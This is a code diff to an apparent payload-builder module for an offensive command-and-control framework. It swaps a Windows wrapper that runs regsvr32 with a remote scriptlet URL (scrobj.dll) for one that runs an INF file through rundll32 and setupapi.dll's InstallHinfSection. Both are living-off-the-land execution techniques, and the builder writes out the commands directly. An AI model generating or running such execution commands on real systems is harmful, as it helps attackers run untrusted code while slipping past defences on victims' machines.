@@ -8,22 +8,34 @@ import json
 import os
 
 
-class cmd_regsvr32_remote_sct(PayloadType):
-    name = "cmd_regsvr32_remote_sct"
+class cmd_setupapi_local_inf(PayloadType):
+    name = "cmd_setupapi_local_inf"
     file_extension = "cmd"
     author = "@hegusung"
     supported_os = [SupportedOS.Windows]
     wrapper = True
-    note = """Executes regsvr32.exe pointing to an URL with a SCT file"""
+    note = """Executes setupapi.exe to a INF file"""
     translation_container = None # "myPythonTranslation"
     agent_path = pathlib.Path(".") / "cmd"
     agent_icon_path = agent_path / "agent_functions" / "cmd.svg"
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
         BuildParameter(
-            name = "url",
+            name = "binary",
             parameter_type=BuildParameterType.String,
-            description="SCT payload URL",
+            default_value="rundll32.exe",
+            description="Rundll32 binary",
+        ),
+        BuildParameter(
+            name = "inf_path",
+            parameter_type=BuildParameterType.String,
+            description="INF path",
+        ),
+        BuildParameter(
+            name = "main_section",
+            parameter_type=BuildParameterType.String,
+            default_value="DefaultInstall",
+            description="Main section name",
         ),
     ]
 
@@ -37,9 +49,11 @@ class cmd_regsvr32_remote_sct(PayloadType):
         build_msg = ""
 
         try:
-            url = self.get_parameter('url')
+            binary = self.get_parameter('binary')
+            inf_path = self.get_parameter('inf_path')
+            main_section = self.get_parameter('main_section')
 
-            payload = "regsvr32 /s /n /u /i:%s scrobj.dll" % url
+            payload = "%s setupapi.dll,InstallHinfSection %s 128 %s" % (binary, main_section, inf_path)
 
             resp.payload = payload
             resp.build_message = "Successfully built!\n"
